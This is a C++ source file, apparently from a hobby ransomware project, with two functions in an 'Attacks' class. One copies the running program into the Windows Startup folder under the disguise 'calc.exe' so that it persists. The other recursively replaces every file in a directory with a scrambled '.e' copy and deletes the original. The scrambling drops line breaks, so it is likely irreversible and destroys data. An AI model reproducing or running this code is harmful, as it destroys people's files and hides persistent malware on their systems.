//
// Created by Lucas on 12/11/2022.
//

#include "Attacks.h"
#include "Util.h"

#include <filesystem>
#include <iostream>
#include <fstream>

void Attacks::MoveToStart() {
    if (Util::GetExecutableName() == R"(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.exe)")  {
        return;
    }
    try {
        std::filesystem::copy(Util::GetExecutableName(), R"(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.exe)");
    } catch(std::filesystem::filesystem_error& e) {
        std::cout << e.what() << std::endl;
    }
}

void Attacks::EncryptFiles(const std::string& dir) {
    for (const auto& entry : std::filesystem::directory_iterator(dir)) {
        if (is_directory(entry.path())) EncryptFiles(entry.path().generic_string());
        else if (entry.path().extension() != ".e") {
            std::string line;
            std::string path(entry.path().generic_string());
            std::ifstream file(path, std::ios::in | std::ios::binary);
            std::ofstream newFile(entry.path().generic_string() + ".e", std::ios::out | std::ios::binary);

            if (file.is_open() && newFile.is_open()) {
                while (std::getline(file, line)) {
                    for (size_t i = 0; i < line.size(); i++) {
                        if (i % 2 == 0) {
                            line[i] += line.length();
                        } else {
                            line[i] -= (int)line.length() / 2;
                            if (line[i] >= 0) line[i] += line.length() * 3;
                        }
                    }
                    newFile << line;
                }
            }

            file.close();
            newFile.close();

            std::filesystem::remove(entry.path());
        }
    }
}
